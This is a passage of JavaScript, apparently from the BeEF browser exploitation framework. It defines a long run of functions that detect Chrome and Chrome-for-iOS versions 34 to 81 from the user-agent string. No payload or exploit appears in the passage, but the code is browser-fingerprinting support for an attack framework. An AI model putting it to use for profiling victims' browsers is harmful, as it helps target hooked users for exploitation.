    isC34iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome 35.
     * @example: beef.browser.isC35()
     */
    isC35: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 35.
     * @example: beef.browser.isC35iOS()
     */
    isC35iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome 36.
     * @example: beef.browser.isC36()
     */
    isC36: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 36.
     * @example: beef.browser.isC36iOS()
     */
    isC36iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome 37.
     * @example: beef.browser.isC37()
     */
    isC37: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 37.
     * @example: beef.browser.isC37iOS()
     */
    isC37iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome 38.
     * @example: beef.browser.isC38()
     */
    isC38: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 38.
     * @example: beef.browser.isC38iOS()
     */
    isC38iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome 39.
     * @example: beef.browser.isC39()
     */
    isC39: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 39.
     * @example: beef.browser.isC39iOS()
     */
    isC39iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome 40.
     * @example: beef.browser.isC40()
     */
    isC40: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 40.
     * @example: beef.browser.isC40iOS()
     */
    isC40iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome 41.
     * @example: beef.browser.isC41()
     */
    isC41: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 41.
     * @example: beef.browser.isC41iOS()
     */
    isC41iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome 42.
     * @example: beef.browser.isC42()
     */
    isC42: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 42.
     * @example: beef.browser.isC42iOS()
     */
    isC42iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome 43.
     * @example: beef.browser.isC43()
     */
    isC43: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 43.
     * @example: beef.browser.isC43iOS()
     */
    isC43iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome 44.
     * @example: beef.browser.isC44()
     */
    isC44: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 44.
     * @example: beef.browser.isC44iOS()
     */
    isC44iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome 45.
     * @example: beef.browser.isC45()
     */
    isC45: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 45.
     * @example: beef.browser.isC45iOS()
     */
    isC45iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome 46.
     * @example: beef.browser.isC46()
     */
    isC46: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 46.
     * @example: beef.browser.isC46iOS()
     */
    isC46iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome 47.
     * @example: beef.browser.isC47()
     */
    isC47: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 47.
     * @example: beef.browser.isC47iOS()
     */
    isC47iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome 48.
     * @example: beef.browser.isC48()
     */
    isC48: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 48.
     * @example: beef.browser.isC48iOS()
     */
    isC48iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome 49.
     * @example: beef.browser.isC49()
     */
    isC49: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 49.
     * @example: beef.browser.isC49iOS()
     */
    isC49iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome 50.
     * @example: beef.browser.isC50()
     */
    isC50: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 50.
     * @example: beef.browser.isC50iOS()
     */
    isC50iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome 51.
     * @example: beef.browser.isC51()
     */
    isC51: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 51.
     * @example: beef.browser.isC51iOS()
     */
    isC51iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome 52.
     * @example: beef.browser.isC52()
     */
    isC52: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 52.
     * @example: beef.browser.isC52iOS()
     */
    isC52iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome 53.
     * @example: beef.browser.isC53()
     */
    isC53: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 53.
     * @example: beef.browser.isC53iOS()
     */
    isC53iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome 54.
     * @example: beef.browser.isC54()
     */
    isC54: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 54.
     * @example: beef.browser.isC54iOS()
     */
    isC54iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome 55.
     * @example: beef.browser.isC55()
     */
    isC55: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 55.
     * @example: beef.browser.isC55iOS()
     */
    isC55iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome 56.
     * @example: beef.browser.isC56()
     */
    isC56: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 56.
     * @example: beef.browser.isC56iOS()
     */
    isC56iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome 57.
     * @example: beef.browser.isC57()
     */
    isC57: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 57.
     * @example: beef.browser.isC57iOS()
     */
    isC57iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome 58.
     * @example: beef.browser.isC58()
     */
    isC58: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 58.
     * @example: beef.browser.isC58iOS()
     */
    isC58iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome 59.
     * @example: beef.browser.isC59()
     */
    isC59: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 59) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 59.
     * @example: beef.browser.isC59iOS()
     */
    isC59iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 59) ? true : false);
    },

    /**
     * Returns true if Chrome 60.
     * @example: beef.browser.isC60()
     */
    isC60: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 60) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 60.
     * @example: beef.browser.isC60iOS()
     */
    isC60iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 60) ? true : false);
    },

    /**
     * Returns true if Chrome 61.
     * @example: beef.browser.isC61()
     */
    isC61: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 61) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 61.
     * @example: beef.browser.isC61iOS()
     */
    isC61iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 61) ? true : false);
    },

    /**
     * Returns true if Chrome 62.
     * @example: beef.browser.isC62()
     */
    isC62: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 62) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 62.
     * @example: beef.browser.isC62iOS()
     */
    isC62iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 62) ? true : false);
    },

    /**
     * Returns true if Chrome 63.
     * @example: beef.browser.isC63()
     */
    isC63: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 63) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 63.
     * @example: beef.browser.isC63iOS()
     */
    isC63iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 63) ? true : false);
    },

    /**
     * Returns true if Chrome 64.
     * @example: beef.browser.isC64()
     */
    isC64: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 64) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 64.
     * @example: beef.browser.isC64iOS()
     */
    isC64iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 64) ? true : false);
    },

    /**
     * Returns true if Chrome 65.
     * @example: beef.browser.isC65()
     */
    isC65: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 65) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 65.
     * @example: beef.browser.isC65iOS()
     */
    isC65iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 65) ? true : false);
    },

    /**
     * Returns true if Chrome 66.
     * @example: beef.browser.isC66()
     */
    isC66: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 66) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 66.
     * @example: beef.browser.isC66iOS()
     */
    isC66iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 66) ? true : false);
    },

    /**
     * Returns true if Chrome 67.
     * @example: beef.browser.isC67()
     */
    isC67: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 67) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 67.
     * @example: beef.browser.isC67iOS()
     */
    isC67iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 67) ? true : false);
    },

    /**
     * Returns true if Chrome 68.
     * @example: beef.browser.isC68()
     */
    isC68: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 68) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 68.
     * @example: beef.browser.isC68iOS()
     */
    isC68iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 68) ? true : false);
    },

    /**
     * Returns true if Chrome 69.
     * @example: beef.browser.isC69()
     */
    isC69: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 69) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 69.
     * @example: beef.browser.isC69iOS()
     */
    isC69iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 69) ? true : false);
    },

    /**
     * Returns true if Chrome 70.
     * @example: beef.browser.isC70()
     */
    isC70: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 70) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 70.
     * @example: beef.browser.isC70iOS()
     */
    isC70iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 70) ? true : false);
    },

    /**
     * Returns true if Chrome 71.
     * @example: beef.browser.isC71()
     */
    isC71: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 71) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 71.
     * @example: beef.browser.isC71iOS()
     */
    isC71iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 71) ? true : false);
    },

    /**
     * Returns true if Chrome 72.
     * @example: beef.browser.isC72()
     */
    isC72: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 72) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 72.
     * @example: beef.browser.isC72iOS()
     */
    isC72iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 72) ? true : false);
    },

    /**
     * Returns true if Chrome 73.
     * @example: beef.browser.isC73()
     */
    isC73: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 73) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 73.
     * @example: beef.browser.isC73iOS()
     */
    isC73iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 73) ? true : false);
    },

    /**
     * Returns true if Chrome 74.
     * @example: beef.browser.isC74()
     */
    isC74: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 74) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 74.
     * @example: beef.browser.isC74iOS()
     */
    isC74iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 74) ? true : false);
    },

    /**
     * Returns true if Chrome 75.
     * @example: beef.browser.isC75()
     */
    isC75: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 75) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 75.
     * @example: beef.browser.isC75iOS()
     */
    isC75iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 75) ? true : false);
    },

    /**
     * Returns true if Chrome 76.
     * @example: beef.browser.isC76()
     */
    isC76: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 76) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 76.
     * @example: beef.browser.isC76iOS()
     */
    isC76iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 76) ? true : false);
    },

    /**
     * Returns true if Chrome 77.
     * @example: beef.browser.isC77()
     */
    isC77: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 77) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 77.
     * @example: beef.browser.isC77iOS()
     */
    isC77iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 77) ? true : false);
    },

    /**
     * Returns true if Chrome 78.
     * @example: beef.browser.isC78()
     */
    isC78: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 78) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 78.
     * @example: beef.browser.isC78iOS()
     */
    isC78iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 78) ? true : false);
    },

    /**
     * Returns true if Chrome 79.
     * @example: beef.browser.isC79()
     */
    isC79: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 79) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 79.
     * @example: beef.browser.isC79iOS()
     */
    isC79iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 79) ? true : false);
    },

    /**
     * Returns true if Chrome 80.
     * @example: beef.browser.isC80()
     */
    isC80: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 80) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 80.
     * @example: beef.browser.isC80iOS()
     */
    isC80iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 80) ? true : false);
    },

    /**
     * Returns true if Chrome 81.
     * @example: beef.browser.isC81()
     */
    isC81: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 81) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 81.
     * @example: beef.browser.isC81iOS()
     */
    isC81iOS: function () {
